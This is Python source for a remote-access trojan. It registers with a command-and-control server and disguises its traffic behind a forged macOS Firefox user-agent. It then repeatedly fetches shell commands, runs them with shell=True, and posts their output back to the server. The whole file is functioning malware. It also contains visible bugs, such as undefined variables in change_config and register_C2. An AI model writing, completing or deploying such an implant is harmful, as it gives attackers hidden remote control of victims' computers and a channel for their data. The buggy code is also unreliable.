import requests
import os
import platform
import yaml
import json
import subprocess
import time




def poll_C2(): 
    with open('config.yaml','r') as f:
        config = yaml.safe_load(f)
    url = config['server']
    user_agent = config['user_agent']

    headers = {"User-Agent": user_agent}

    r = requests.get(url, headers=headers)

    return r.json()


def notify_C2(command: dict, command_result):

    with open('config.yaml','r') as f:
        config = yaml.safe_load(f)
    server_domain = config['server']
    user_agent = config['user_agent']

    deactivation_url = server_domain + "command/" + command['_id'] + "/done"
    headers = {"User-Agent": user_agent}
    requests.get(deactivation_url, headers=headers)

    pyrat_result = {
        'command_id': command['_id'],
        'command_type': command['command_type'],
        'argument': command['argument'],
        'result': command_result
        }
    result_url = server_domain + "result"

    print(pyrat_result)

    requests.post(result_url,json=pyrat_result, headers=headers)

    return
 

def execute(bash_command) -> str:
    bash_run = subprocess.run(bash_command, 
                   shell=True,
                   check=True, 
                   text=True,
                   stdout=subprocess.PIPE)

    return bash_run.stdout
    
def change_config(server_value):
    try:
        with open('config.yaml', 'r+') as f:
            data = yaml.safe_load(f)
            data['server'] = server_value
            yaml.safe_dump(data, f)
        result =  "OK CONFIG"
    except Exception:
        result = "ERROR CONFIG"
    return result
   

def handle_command(command):
    print("Running command : " + command['_id'])
    command_type = command['command_type']
    if command_type == "execute":
        command_result = execute(command['argument'])
    elif command_type == "config":
        command_result = change_config(argument)
    else:
        command_result = "ERROR : Unknown command"

    notify_C2(command, command_result)

def set_user_agent():
    #OS Version

    if platform.system() == "Darwin":
        os = "Macintosh; Intel Mac OS X "

    tmp = (platform.mac_ver()[0])
    print(tmp)
    os_v = os + tmp[0] + tmp[1]

    #Gecko version
    with open("/Applications/Firefox.app/Contents/Resources/application.ini") as f:
        lines = (f.readlines())
        for l in lines:
            if "Version" in l:
                gecko_version = l.split("=")[1].replace("\n","")

    user_agent = "Mozilla/5.0 (" + os_v + "; rv:" + gecko_version + ") Gecko/20100101 Firefox/"+gecko_version

    with open('config.yaml','r+') as f:
        data = yaml.safe_load(f)
        data['user_agent'] = user_agent
        yaml.safe_dump(data, f)
    
    return user_agent

def register_C2():
    with open('config.yaml','r') as f:
        config = yaml.safe_load(f)
    server_domain = config['server']
    user_agent = config['user_agent']

    register_url = server_domain + "register/"
    headers = {"User-Agent": user_agent}
    r = requests.get(register_url, headers=headers)
    auth_cookie = r.json()['cookie']


    with open('config.yaml','r') as f:
        config = yaml.safe_load(f)
        config['cookie'] = auth_cookie
        yaml.safe_dump(data, f)

def main():
    running = True
    last_exec = time.time()

    set_user_agent()
    register_C2()
    
    while(running):
        now = time.time()
        if (now - last_exec) > 5:
            to_do = poll_C2()
            for cmd in to_do:
                handle_command(cmd)
            last_exec = now
        else:
            time.sleep(10)


if __name__ == "__main__":
    main()